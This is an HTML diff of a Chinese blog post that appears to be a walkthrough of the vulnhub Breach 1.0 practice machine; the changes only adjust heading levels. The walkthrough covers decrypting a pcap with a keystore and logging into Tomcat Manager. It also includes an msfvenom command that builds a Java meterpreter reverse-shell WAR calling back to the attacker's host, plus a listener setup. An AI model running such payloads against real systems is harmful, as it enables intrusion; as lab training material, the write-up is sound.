@@ -602,8 +602,8 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="vulnhub靶场–breach1-0"><a href="#vulnhub靶场–breach1-0" class="headerlink" title="vulnhub靶场–breach1.0"></a>vulnhub靶场–breach1.0</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>vulnhub是一个提供各种漏洞平台的综合靶场，可供下载多种虚拟机进行下载，本地VM打开即可，像做游戏一样去完成渗透测试、提权、漏洞利用、代码审计等等有趣的实战。</p>
-<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>1.kail</p>
+                <h1 id="vulnhub靶场–breach1-0"><a href="#vulnhub靶场–breach1-0" class="headerlink" title="vulnhub靶场–breach1.0"></a>vulnhub靶场–breach1.0</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>vulnhub是一个提供各种漏洞平台的综合靶场，可供下载多种虚拟机进行下载，本地VM打开即可，像做游戏一样去完成渗透测试、提权、漏洞利用、代码审计等等有趣的实战。</p>
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>1.kail</p>
 <p>网络适配器选择host-only仅主机模式</p>
 <p>2.靶机breach1.0</p>
 <p>下载地址</p>
@@ -613,7 +613,7 @@
 <p><img src="https://pic.imgdb.cn/item/6318a4a416f2c2beb145df2b.jpg"></p>
 <p>打开靶机之后是这样的</p>
 <p><img src="https://pic.imgdb.cn/item/6318a4f016f2c2beb1462dde.jpg"></p>
-<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><blockquote>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><blockquote>
 <p>在渗透测试中，信息搜集是必不可少的</p>
 </blockquote>
 <p>首先在kail中输入ifconfig查看本地ip地址</p>
@@ -626,7 +626,7 @@
 <blockquote>
 <p>蜜罐：蜜罐系统就是系统管理员放置在网络中的一个假情报，一个捕鼠器，用于发现攻击并产生预警。</p>
 </blockquote>
-<h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><p>这里我们直接访问80端口，进入web页面</p>
+<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>这里我们直接访问80端口，进入web页面</p>
 <p><img src="https://pic.imgdb.cn/item/6318a98716f2c2beb14b9e08.jpg"></p>
 <blockquote>
 <p>Initech 遭到破坏，董事会投票决定请其内部 Initech Cyber Consulting, LLP 部门提供协助。 鉴于违规行为的高调性质和近乎灾难性的损失，随后对该公司进行了许多尝试。 Initech 已委托由 Bill Lumbergh、CISSP 和 Peter Gibbons、C|EH、SEC+、NET+、A+ 领导的 TOP 顾问对违规行为进行控制和分析。<br>公司几乎没有意识到，这次入侵不是技术娴熟的黑客所为，而是一位心怀不满的前雇员在离职时送给他的临别礼物。 TOP 顾问一直在努力控制违规行为。 然而，他们自己的职业道德和留下的烂摊子可能是公司的垮台。</p>
@@ -667,7 +667,7 @@
 </blockquote>
 <p>点开链接下载pcap文件</p>
 <p><img src="https://pic.imgdb.cn/item/63194add16f2c2beb1bf28f3.jpg"></p>
-<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>用wireshark打开刚刚下载的pcap文件，</p>
+<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>用wireshark打开刚刚下载的pcap文件，</p>
 <p><img src="https://pic.imgdb.cn/item/63194d7916f2c2beb1c1f753.jpg"></p>
 <p>有很多是TLSv1.2协议，内容都是加密的，无法看到内容。那我们怎么办呢？之前下载的keystore文件是不是还没用到，通过万能的百度我知道了可以用wiresharl导入密钥，配置好算法，可以解密报文，从而看到被加密的数据。接下来我们就使用keystore文件制作一个数字证书，导入到wireshark中，执行以下命令将密钥库导入到数字证书</p>
 <pre class="line-numbers language-none"><code class="language-none">keytool -importkeystore -srckeystore d:\keystore -destkeystore d:\tomcat.p12 -deststoretype PKCS12 -srcalias tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -696,7 +696,7 @@
 <p>得到了账号密码，登录”Tomcat Manager Application”</p>
 <p>burpsuite放包后，进入网站</p>
 <p><img src="https://pic.imgdb.cn/item/6318a49d16f2c2beb145d4bf.jpg"></p>
-<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>在这个界面我们看到有一个可以上传文件的地方，由此想到可以利用msf生成一个木马文件进行上传，执行以下命令生成木马文件</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>在这个界面我们看到有一个可以上传文件的地方，由此想到可以利用msf生成一个木马文件进行上传，执行以下命令生成木马文件</p>
 <pre class="line-numbers language-none"><code class="language-none">msfvenom -p java/meterpreter/reverse_tcp lhost=192.168.110.128 lport=9999 -f war -o shell.war <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>开启另一个终端，输入msfconsole，开启监听</p>
@@ -722,7 +722,7 @@ set lport 9999<span aria-hidden="true" class="line-numbers-rows"><span></span><s
 <p><img src="https://pic.imgdb.cn/item/6319716316f2c2beb1e6e93c.jpg"></p>
 <p>进入php文件，可以看到有一个数据库的东西</p>
 <p><img src="https://pic.imgdb.cn/item/6319716316f2c2beb1e6e93c.jpg"></p>
-<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>执行以下命令进入数据库</p>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>执行以下命令进入数据库</p>
 <pre class="line-numbers language-none"><code class="language-none">mysql -uroot -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>查看数据库</p>
@@ -750,7 +750,7 @@ set lport 9999<span aria-hidden="true" class="line-numbers-rows"><span></span><s
 <blockquote>
 <p>There’s nothing</p>
 </blockquote>
-<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>没有什么有用的信息，执行history查看一下历史命令</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>没有什么有用的信息，执行history查看一下历史命令</p>
 <p><img src="https://pic.imgdb.cn/item/6319881d16f2c2beb1febe0c.jpg"></p>
 <p>通过分析可以看出之前切换到了blumbergh用户，那么我们也尝试切换到blumbergh</p>
 <p><img src="https://pic.imgdb.cn/item/6319893616f2c2beb1000ce7.jpg"></p>
